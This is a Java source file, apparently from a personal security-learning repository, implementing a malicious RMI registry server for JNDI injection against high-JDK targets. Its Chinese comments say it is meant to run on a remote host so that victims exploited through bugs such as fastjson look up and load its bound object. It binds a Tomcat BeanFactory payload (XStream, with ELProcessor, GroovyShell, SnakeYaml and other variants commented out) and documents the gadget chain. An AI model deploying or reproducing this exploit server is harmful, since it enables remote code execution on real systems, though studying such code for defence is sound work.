package com.xjjlearning.hack.java.highjdk;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.xjjlearning.hack.java.highjdk.poc.*;
import org.apache.naming.ResourceRef;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 这个server应该放到远程服务器, 当发送给受害者比如fastjson漏洞的时候来远程lookup我们的registry绑定的类, 加载到本地
 */
public class TomcatBeanFactoryServer {

    // Bean的选择
//    1.JDK或者常用库的类
//    2.有public修饰的无参构造方法
//    3.public修饰的只有一个String.class类型参数的方法，且该方法可以造成漏洞(可多个方法组合)

    /**
     * javax.el.ELProcessor#eval
     * groovy.lang.GroovyShell#evaluate
     */

    // ...
    // InitialContext#lookup("rmi://127.0.0.1:1099/Calc");
    //  GenericURLContext#lookup()
    //   RegistryContext#lookup()
    //    NamingManager#getObjectInstance()
    //     org.apache.naming.factory.BeanFactory#getObjectInstance(ref, name, nameCtx, environment);
    //      method.invoke(bean, valueArray);
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

//        ResourceRef ref = new TomcatELProcessor().getPayload();
//        ResourceRef ref = new TomcatGroovyShell().getPayload();
//        ResourceRef ref = new TomcatMLet().getPayload();
//        ResourceRef ref = new TomcatGroovyClassLoader().getPayload();
//        ResourceRef ref = new TomcatSnakeYaml().getPayload();
        ResourceRef ref = new TomcatXStream().getPayload();

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Calc", referenceWrapper);  // 绑定目录名
        System.out.println("Server Started!");
//        NamingManager.getObjectInstance()
    }
}